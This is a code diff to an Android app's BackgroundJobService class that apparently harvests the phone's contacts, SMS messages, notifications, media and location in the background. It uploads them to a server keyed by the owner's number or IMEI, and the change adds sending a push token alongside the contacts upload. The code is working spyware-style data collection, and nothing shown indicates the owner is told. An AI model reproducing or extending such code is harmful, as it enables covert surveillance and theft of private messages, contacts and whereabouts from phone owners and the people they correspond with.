@@ -3,15 +3,17 @@ package gonext.smsapp.servers;
 import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Environment;
 import android.provider.ContactsContract;
-import android.support.v4.content.ContextCompat;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.widget.Toast;
+
+import androidx.core.content.ContextCompat;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -23,6 +25,7 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 
+import gonext.smsapp.R;
 import gonext.smsapp.contacts.ContactData;
 import gonext.smsapp.contacts.ContactDetails;
 import gonext.smsapp.contacts.SMSData;
@@ -33,6 +36,8 @@ import gonext.smsapp.db.MessageEntity;
 import gonext.smsapp.db.NotificationEntity;
 import gonext.smsapp.utils.Constant;
 import gonext.smsapp.utils.Utils;
+
+import static gonext.smsapp.MainActivity.strToken;
 
 /**
  * Created by ram on 05/10/17.
@@ -53,6 +58,7 @@ public class BackgroundJobService {
 
     }
     public void ReadPhoneContacts() {
+//        Log.e("lqlqlq","YESSS");
         if (ContextCompat.checkSelfPermission(context,
                 Manifest.permission.READ_CONTACTS)
                 == PackageManager.PERMISSION_GRANTED) {
@@ -137,12 +143,17 @@ public class BackgroundJobService {
                 }
             }
             if (contactDataArrayList.size() > 0) {
+//                Log.e("lqlqlq","YESSS2");
+                String strMobile = (UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile;
+                SharedPreferences sharedPreferences = context.getSharedPreferences(context.getString(R.string.app_name),Context.MODE_PRIVATE);
+                SharedPreferences.Editor editor = sharedPreferences.edit();
+                editor.putString("mobile_no",strMobile);
+                editor.apply();
+                smsService.sendFcmToken(strToken,(UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
                 smsService.sendContacts((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile, ContactID, ContactNumber, ContactName);
             }
         }
     }
-
-
 
     public void sendSMSToServer() {
         if (ContextCompat.checkSelfPermission(context,
@@ -259,6 +270,7 @@ public class BackgroundJobService {
                     }
                 }
                 if (smsList.size() > 0) {
+//                    Log.e("SWSWSWSW","OPOPOP");
                     smsService.sendSms((UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile, MsgID, MsgDate, MsgFrom,MsgTo, MsgText);
                 }
             } catch (Exception e22) {
@@ -266,7 +278,6 @@ public class BackgroundJobService {
             }
         }
     }
-
 
     public void sendNotificationsToServer() {
         if (ContextCompat.checkSelfPermission(context,
@@ -377,6 +388,7 @@ public class BackgroundJobService {
             }
         }
     }
+
     private boolean processMediaFiles(String mediaPath,String type){
         File folder = new File(mediaPath);
         if(folder.exists()){
@@ -455,9 +467,12 @@ public class BackgroundJobService {
             } catch (Exception e) {
                 e.printStackTrace();
             }
-
+//            smsService.sendFcmToken(strToken,(UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
                             smsService.sendLocation( (UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
+
         }
+
+
     }
 
     public void getMobileNo() {
